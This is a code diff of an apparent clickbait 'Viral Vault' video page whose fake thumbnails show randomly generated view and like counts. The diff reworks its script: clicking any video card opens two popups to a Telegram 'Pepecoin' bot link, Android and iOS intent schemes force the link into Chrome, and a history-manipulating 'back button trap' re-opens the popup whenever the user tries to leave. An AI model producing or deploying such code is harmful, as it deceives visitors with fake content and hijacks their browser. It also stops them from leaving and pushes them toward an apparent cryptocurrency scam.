@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>🔥 Viral Vault</title>
 
-  <!-- Tailwind + line clamp -->
+  <!-- Tailwind -->
   <script src="https://cdn.tailwindcss.com?plugins=line-clamp"></script>
 </head>
 
@@ -14,7 +14,6 @@
   <div class="max-w-6xl mx-auto p-4">
     <h1 class="text-2xl font-bold mb-4">🔥 Trending Videos</h1>
 
-    <!-- Grid -->
     <div id="grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"></div>
   </div>
 
@@ -61,14 +60,10 @@
 
       card.innerHTML = `
         <img src="${img}" class="w-full h-40 object-cover">
-
         <div class="p-3">
-          <!-- Title -->
           <h2 class="text-sm font-semibold mb-1 line-clamp-2">
             ${titles[i] || "New Video"}
           </h2>
-
-          <!-- Stats -->
           <div class="flex justify-between text-xs text-gray-400">
             <span>👁 ${Math.floor(Math.random() * 100)}K</span>
             <span>👍 ${Math.floor(Math.random() * 10)}K</span>
@@ -81,79 +76,61 @@
   </script>
 
   <script>
-const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
+    const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
-let clickCount = 0;
-
-// ✅ SAFE POPUP FUNCTION
-
-function openPopups(url, count){
-  let opened = [];
-
-  // ✅ first wave (user gesture)
-  for(let i = 0; i < count; i++){
-    let win = window.open(url, "_blank");
-    if(win){
-      opened.push(win);
+    // ✅ safe popup
+    function openPopup(url){
+      let win = window.open(url, "_blank");
+      if(!win){
+        window.location.href = url;
+      }
     }
-  }
 
-  // ✅ fallback (blocked হলে)
-  if(opened.length === 0){
-    window.location.href = url;
-  }
-}
-    
-function openExternal(){
+    // ✅ main popup logic (2 popup safe)
+    function openExternal(){
+      const ua = navigator.userAgent.toLowerCase();
+      const isAndroid = /android/.test(ua);
+      const isIOS = /iphone|ipad|ipod/.test(ua);
 
-  const ua = navigator.userAgent.toLowerCase();
-  const isAndroid = /android/.test(ua);
-  const isIOS = /iphone|ipad|ipod/.test(ua);
+      let url1 = smartLink;
+      let url2 = smartLink;
 
-  // ✅ only 2 popup (safe limit)
-  let url1 = smartLink;
-  let url2 = smartLink;
+      // Android intent
+      if(isAndroid){
+        url1 = "intent://" +
+          smartLink.replace(/^https?:\/\//,'') +
+          "#Intent;scheme=https;package=com.android.chrome;end";
+      }
 
-  // 🤖 ANDROID intent
-  if(isAndroid){
-    url1 = "intent://" +
-      smartLink.replace(/^https?:\/\//,'') +
-      "#Intent;scheme=https;package=com.android.chrome;end";
-  }
+      // iOS chrome
+      if(isIOS){
+        url1 = "googlechrome://" +
+          smartLink.replace(/^https?:\/\//,'');
+      }
 
-  // 🍎 IOS chrome
-  if(isIOS){
-    url1 = "googlechrome://" +
-      smartLink.replace(/^https?:\/\//,'');
-  }
+      let win1 = window.open(url1, "_blank");
+      let win2 = window.open(url2, "_blank");
 
-  // ✅ OPEN BOTH instantly (IMPORTANT)
-  let win1 = window.open(url1, "_blank");
-  let win2 = window.open(url2, "_blank");
+      if(!win1 && !win2){
+        window.location.href = smartLink;
+      }
+    }
 
-  // fallback
-  if(!win1 && !win2){
-    window.location.href = smartLink;
-  }
-               }
-    
-// 🔥 CLICK EVENT
-document.addEventListener("click", function(e){
-  if(e.target.closest(".download"))
-    e.preventDefault();
-    openExternal();
-  }
-});
+    // ✅ CLICK ANY CARD
+    document.addEventListener("click", function(e){
+      const card = e.target.closest("#grid > div");
+      if(card){
+        e.preventDefault();
+        openExternal();
+      }
+    });
 
-// 🔥 BACK BUTTON SAFE VERSION
-history.pushState(null, null, location.href);
-
-window.onpopstate = function () {
-  history.pushState(null, null, location.href);
-
-  // 1টা popup only (safe)
-  openPopup(smartLink);
-};
+    // ✅ back button trap
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.pushState(null, null, location.href);
+      openPopup(smartLink);
+    };
   </script>
 
 </body>
